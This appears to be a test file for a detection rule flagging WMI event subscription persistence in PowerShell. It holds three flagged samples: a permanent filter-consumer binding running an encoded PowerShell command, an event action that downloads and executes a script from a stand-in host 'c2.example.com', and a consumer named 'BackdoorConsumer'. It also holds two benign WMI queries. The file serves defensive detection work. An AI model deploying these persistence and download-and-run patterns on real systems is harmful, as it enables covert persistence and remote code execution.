# ruleid: ps-wmi-event-subscription-persistence
$EventFilter = Set-WMIInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="PersistFilter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$EventConsumer = Set-WMIInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="PersistConsumer"; CommandLineTemplate="powershell.exe -enc SQBFAFgA..."}
Set-WMIInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$EventFilter; Consumer=$EventConsumer}

# ruleid: ps-wmi-event-subscription-persistence
Register-WmiEvent -Class Win32_ProcessStartTrace -Action { IEX (New-Object Net.WebClient).DownloadString('http://c2.example.com/beacon.ps1') }

# ruleid: ps-wmi-event-subscription-persistence
$consumer = New-Object PSObject -Property @{
    '__CLASS' = 'ActiveScriptEventConsumer'
    'Name' = 'BackdoorConsumer'
    'ScriptingEngine' = 'VBScript'
    'ScriptText' = 'Set objShell = CreateObject("WScript.Shell") : objShell.Run "powershell -enc ..."'
}
Set-WMIInstance -Path "root\subscription:ActiveScriptEventConsumer" -Arguments $consumer

# ok: ps-wmi-event-subscription-persistence
Get-WmiObject -Class Win32_Process | Where-Object { $_.Name -eq "notepad.exe" } | Select-Object ProcessId, Name

# ok: ps-wmi-event-subscription-persistence
$os = Get-WmiObject -Class Win32_OperatingSystem
Write-Host "OS: $($os.Caption) Build: $($os.BuildNumber)"
